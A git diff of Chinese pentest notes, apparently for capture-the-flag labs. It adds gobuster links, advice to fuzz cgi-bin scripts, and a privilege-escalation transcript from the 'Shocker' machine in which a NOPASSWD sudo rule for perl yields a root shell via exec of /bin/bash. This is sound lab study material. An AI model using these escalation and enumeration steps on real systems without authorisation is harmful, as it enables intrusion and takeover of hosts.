@@ -26,7 +26,13 @@ sudo nmap -T4 -A -p port ip  //T4 提高扫描速率; A 探测系统类型、服
 
 #### dirsearch
 
-1. 遇到 `403 /cgi-bin/`的时候，可以再次利用dirsearch或者其他目录fuzz工具进一步探索cgi-bin目录下的内容。
+1. 遇到 `403 /cgi-bin/`的时候，可以dirbuster、gobuster或者其他目录fuzz工具[进一步探索cgi-bin目录下的后缀名为`cgi​, sh​, ​pl​, ​py...`的文件。](https://twitter.com/_johnhammond/status/1348253792530280448)
+
+#### gobuster 
+
+1. [常用命令1](https://vk9-sec.com/gobuster-how-to/)
+2. [常用命令2](https://blog.intigriti.com/2021/07/05/hacker-tools-gobuster/)
+3. [原项目](https://github.com/OJ/gobuster)
 
 ## 端口和用到的端口命令
 
@@ -102,3 +108,24 @@ For instance, on Windows, SMB can run directly over TCP/IP without the need for 
 2. 注意指定rhost攻击时，可能也需要指定rport
 3. `show payloads`拿到实际payload列表自行尝试单个payload
 4. 卸载重装最新版本 `sudo apt-get remove --auto-remove metasploit-framework`
+
+
+## 提取
+
+### 低权限shell提权案例
+
+
+```
+10.10.10.56> sudo -l
+Matching Defaults entries for shelly on Shocker:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User shelly may run the following commands on Shocker:
+    (root) NOPASSWD: /usr/bin/perl
+10.10.10.56> sudo perl -e 'exec "/bin/bash"'
+10.10.10.56> whoami
+root
+```
+
+
